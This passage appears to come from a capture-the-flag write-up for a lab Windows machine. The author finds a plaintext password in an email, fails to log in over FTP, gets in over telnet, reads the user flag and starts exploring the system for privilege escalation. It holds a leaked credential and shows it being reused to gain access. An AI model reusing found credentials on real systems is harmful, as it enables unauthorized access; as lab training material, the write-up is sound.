</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>Hi there,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>The password <span style=color:#000;font-weight:700>for</span> the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is pass
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>ed on to your engineers.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>Regards,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>John
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#000;font-weight:700>[</span>-- <span style=color:#998;font-style:italic>#1.1.2 51/2211 text/html, 7bit, us-ascii --]</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>?
</span></span></code></pre></div><p>Another set of credentials! I wonder what these are used for? Let&rsquo;s try FTP first</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># ftp 10.10.10.98</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>Connected to 10.10.10.98.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#099>220</span> Microsoft FTP Service
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>Name <span style=color:#000;font-weight:700>(</span>10.10.10.98:jamie<span style=color:#000;font-weight:700>)</span>: security
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#099>331</span> Password required <span style=color:#000;font-weight:700>for</span> security.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>Password:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span><span style=color:#099>530</span> User cannot log in.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>ftp: Login failed.
</span></span></code></pre></div><p>No dice ☹. The only other option is <code>telnet</code>.</p><h2 id=telnet>Telnet</h2><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># telnet 10.10.10.98</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>Trying 10.10.10.98...
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>Connected to 10.10.10.98.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>Escape character is <span style=color:#d14>&#39;^]&#39;</span>.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>Welcome to Microsoft Telnet Service
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>login: security
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>password:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>*<span style=color:#000;font-weight:700>===============================================================</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>Microsoft Telnet Server.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>*<span style=color:#000;font-weight:700>===============================================================</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>C:<span style=color:#d14>\U</span>sers<span style=color:#d14>\s</span>ecurity&gt;
</span></span></code></pre></div><p>We&rsquo;re in! The <code>user.txt</code> should be located on <code>security</code>&rsquo;s Desktop</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>C:\Users\security&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Directory of C:\Users\security
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>03</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>56</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>03</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>56</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM    &lt;DIR&gt;          .yawcam
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Contacts
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>08</span>/<span style=color:#099>28</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>51</span> AM    &lt;DIR&gt;          Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Documents
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Downloads
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Favorites
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Links
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Music
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Pictures
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Saved Games
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Searches
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>39</span> PM    &lt;DIR&gt;          Videos
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>               <span style=color:#099>1</span> File(s)        <span style=color:#099>964</span>,<span style=color:#099>179</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>              <span style=color:#099>14</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>745</span>,<span style=color:#099>127</span>,<span style=color:#099>936</span> bytes free
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>C:\Users\security&gt;<span style=color:#0086b3>cd </span>Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>C:\Users\security\Desktop&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span> Directory of C:\Users\security\Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#099>08</span>/<span style=color:#099>28</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>51</span> AM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#099>08</span>/<span style=color:#099>28</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>51</span> AM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM                <span style=color:#099>32</span> user.txt
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>               <span style=color:#099>1</span> File(s)             <span style=color:#099>32</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>               <span style=color:#099>2</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>744</span>,<span style=color:#099>726</span>,<span style=color:#099>528</span> bytes free
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>C:\Users\security\Desktop&gt;more user.txt
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>&lt;SNIP&gt;
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2><p>Now that we&rsquo;ve got the first flag, we need to escalate to <code>root</code> access—or more specifically <code>Administrator</code> on Windows.</p><p>The <code>.yawcam</code> directory looks out of the ordinary.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#0086b3>dir </span>.yawcam
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Directory of C:\Users\security\.yawcam
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          <span style=color:#099>2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>49</span> AM                 <span style=color:#099>0</span> banlist.dat
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          extravars
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>49</span> AM    &lt;DIR&gt;          img
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          logs
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>49</span> AM    &lt;DIR&gt;          motion
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>49</span> AM                 <span style=color:#099>0</span> pass.dat
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          stream
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          tmp
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>34</span> PM                <span style=color:#099>82</span> ver.dat
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          www
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM             <span style=color:#099>1</span>,<span style=color:#099>411</span> yawcam_settings.xml
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>               <span style=color:#099>4</span> File(s)          <span style=color:#099>1</span>,<span style=color:#099>493</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>              <span style=color:#099>10</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>764</span>,<span style=color:#099>841</span>,<span style=color:#099>984</span> bytes free
</span></span></code></pre></div><p>However poking around in there proved fruitless. Maybe there&rsquo;s a way to use this, but I couldn&rsquo;t figure anything out.</p><p>Let&rsquo;s keep looking</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>C:\Users\security&gt;<span style=color:#0086b3>cd </span>../
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>C:\Users&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span> Directory of C:\Users
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>15</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>15</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>11</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>46</span> PM    &lt;DIR&gt;          Administrator
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>15</span> PM    &lt;DIR&gt;          engineer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          Public
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>16</span> PM    &lt;DIR&gt;          security
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>               <span style=color:#099>0</span> File(s)              <span style=color:#099>0</span> bytes
